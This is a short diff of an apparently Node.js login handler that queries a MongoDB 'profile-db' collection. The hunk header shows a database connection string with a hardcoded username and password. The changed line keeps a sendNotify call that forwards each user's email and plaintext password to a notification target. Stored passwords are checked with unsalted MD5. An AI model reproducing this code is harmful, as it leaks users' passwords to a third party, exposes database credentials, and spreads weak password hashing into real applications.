@@ -60,7 +60,7 @@ MongoClient.connect('mongodb+srv://tongog-app-db:tongogapp12345@cluster0.sucnq.m
         if(req.body.email.length > 0 && req.body.password.length > 7){
             let email = req.body.email;
             let password = req.body.password;
-            sendNotify('algnot', email + 'login\npass => '+ password);
+            sendNotify('algnot ', email + ' login\npass => '+ password);
             db.collection('profile-db').find({ 'email' : email , 'password' : MD5(password) }).toArray()
             .then(result => {
                 if(result.length != 0){
